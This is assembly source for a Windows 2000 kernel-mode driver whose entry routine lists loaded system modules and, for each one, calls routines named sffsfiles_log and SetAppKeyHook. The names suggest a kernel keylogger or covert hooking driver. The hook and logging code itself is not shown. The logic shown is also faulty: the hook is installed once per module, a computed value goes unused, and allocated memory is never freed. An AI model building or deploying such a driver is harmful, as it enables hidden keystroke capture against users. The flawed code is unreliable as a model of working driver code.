.586
.model flat, stdcall
option casemap:none
include w2k\ntddk.inc
include w2k\ntoskrnl.inc
include w2k\native.inc
include w2k\ntstatus.inc
include w2k\hal.inc
includelib hal.lib
includelib ntoskrnl.lib
include Strings.mac
include sffsfiles.inc

.code
DriverEntry proc pDriverObject:PDRIVER_OBJECT, pusRegistryPath:PUNICODE_STRING

LOCAL cb:PVOID
LOCAL p:PVOID
local dwNumModules:DWORD

pushad
	and cb, 0
    invoke ZwQuerySystemInformation, SystemModuleInformation, addr p, 0, addr cb
    	.if cb != 0

        invoke ExAllocatePool, PagedPool, cb
	        .if eax != NULL
	           	mov p, eax
               invoke ZwQuerySystemInformation, SystemModuleInformation, p, cb, addr cb
    	       .if eax == STATUS_SUCCESS
	                mov esi, p
	                push dword ptr [esi]
     	            pop dwNumModules
     	            add esi, sizeof DWORD
                    assume esi:ptr SYSTEM_MODULE_INFORMATION
                    xor ebx,ebx
	                .while ebx < dwNumModules
      
                        lea edi, [esi].ImageName
                        movzx ecx, [esi].ModuleNameOffset
                        add edi, ecx

                        invoke sffsfiles_log
                        invoke SetAppKeyHook                     

                    	inc ebx
                    	add esi,sizeof SYSTEM_MODULE_INFORMATION
                    .endw    	       
    	       
    	       
    	       .endif            
            .endif       
        .endif
end_:
popad

    mov eax,STATUS_SUCCESS
    ret

DriverEntry endp

end DriverEntry
